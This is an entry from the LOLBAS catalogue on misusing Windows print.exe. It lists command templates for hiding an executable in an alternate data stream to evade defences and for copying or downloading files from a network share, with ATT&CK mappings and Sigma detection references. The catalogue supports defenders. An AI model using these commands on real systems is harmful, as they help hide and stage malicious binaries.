---
title: "Print.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Print/
fetched_at: 2026-09-20T17:11:03Z
license: unspecified
category: windows
---

Used by Windows to send files to the printer

## Paths
- C:\Windows\System32\print.exe
- C:\Windows\SysWOW64\print.exe

## Resources
- [https://twitter.com/Oddvarmoe/status/985518877076541440](https://twitter.com/Oddvarmoe/status/985518877076541440)
- [https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410](https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410)

## Acknowledgements
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml)
- IOC: Print.exe retrieving files from internet
- IOC: Print.exe creating executable files on disk

## Alternate data streams

1. Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

```
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

   - Use case: Hide binary file in alternate data stream to potentially bypass defensive counter measures

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

2. Copy file from source to destination

```
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
```

   - Use case: Copy files

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

3. Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

```
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
```

   - Use case: Copy/Download file from remote server

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105
